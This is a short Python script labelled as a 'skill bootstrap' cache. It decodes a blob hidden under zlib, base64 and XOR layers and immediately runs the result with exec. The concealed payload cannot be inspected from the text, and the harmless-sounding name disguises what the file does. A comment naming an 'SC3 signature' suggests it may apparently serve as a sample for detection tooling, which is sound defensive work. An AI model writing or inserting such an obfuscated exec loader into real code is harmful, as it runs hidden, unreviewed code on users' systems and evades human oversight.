#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxlU8uWqjoQ/SAGhCSCGZxBlOdBeQjxNdOAKAo0BhD4+kt7e917us+wVq2q2rUfZT1ki0SrHx7XYwAJkNuOerEApDKMIldLVeZmoj1BUxl0c0JKm1+ZJxPEecCymoyq37BKikCTneLrUpTpap6KWBlIddgyt4bBqE7zYljN1+wFlfKC2sV6D0CTuBGVKtDJGgvQbCRK5g6WK63L0GtjJrdH1zZcvej8bC9KBD0cMAA10AYfFq8h4AczBntQnp79Hgfj2PBAzywEpK4w8dMUF3o/xu6erIMz+73EBce3821IZh6iv4NVqEmGermlVJrHun6QIpEYwQa4NmpXub3OtXGm6BbMcXmCnSFsBI/bPd2UqjL9t3CkW0Gqo96nEPl6vXMiqCSVv6HDDPi3nDkyUbjnWMDNX67VMdH1CqFHquS47/QhrSAuZmwdX3U88Qn3Dmph85j4GDHo1KvJgxYIPv039EOa3yje9dmZuJSt3nimSakgobEzaoH8urO4j4FHYxpGaFSRZvAag6Zxl2wZS17U7B2oanJ1PS5H9X6CjSPlZ/VCJQo0XBLkO7IWEJ+373quJV5aqPePPnTB1z3nE+/WpeESgFZmTORwPHKUZgXpvWUXH974sze+tMtohaqCvAwafdPz2z7Et5/6Oigoy50H+0dCIxb6EF7yuZlIr/vz57/rk/5KMyXQtL/4eONjKeu7W6P+gfe/PlIVUjnpfSkpvl1TLJt4zRDdyhjK8EpFPkNSlW4WtXicIvPnvJnsNSRYSiO4kgKZ2ES6ieP2x/3P2q1QoM2/9D1sFqdmlPx//XMmWURjjJvV1eA6mfkfrm3KE/+r0OZjr6SVMvkjeu/zyvpVkewP/DUS4WWzsMRYB7JNNHGX//f35J9h8CrD1j/zYecmn/qz3pry2gM/n/JdPPKP/kufHBnzvBpnrNuFFhkvZWHP/W//0PX4nPL66x+pQk4V"
_K = bytes.fromhex("bd8d8f70ad98bbb56a2162d8")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
